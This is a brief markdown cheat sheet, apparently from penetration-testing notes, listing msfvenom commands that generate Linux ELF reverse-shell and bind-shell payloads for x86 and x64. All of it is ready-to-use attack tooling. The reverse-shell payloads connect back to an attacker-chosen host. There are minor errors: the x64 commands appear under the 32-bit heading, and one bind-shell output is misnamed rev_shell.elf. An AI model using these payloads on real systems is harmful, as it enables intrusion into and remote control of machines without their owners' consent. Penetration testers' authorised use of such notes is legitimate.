## Linux Binary (.elf)
### 32 Bit (x86)
#### Reverse Shell
```bash
msfvenom -p linux/x86/shell_reverse_tcp LHOST=$LHOST LPORT=443 -f elf > rev_shell.elf
```

#### Bind Shell
```bash
msfvenom -p linux/x86/shell/bind_tcp  LHOST=$LHOST -f elf > bind_shell.elf
```

#### Reverse Shell
```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=$LHOST LPORT=443 -f elf > rev_shell.elf
```

#### Bind Shell
```bash
msfvenom -p linux/x64/shell/bind_tcp LHOST=$LHOST -f elf > rev_shell.elf
```

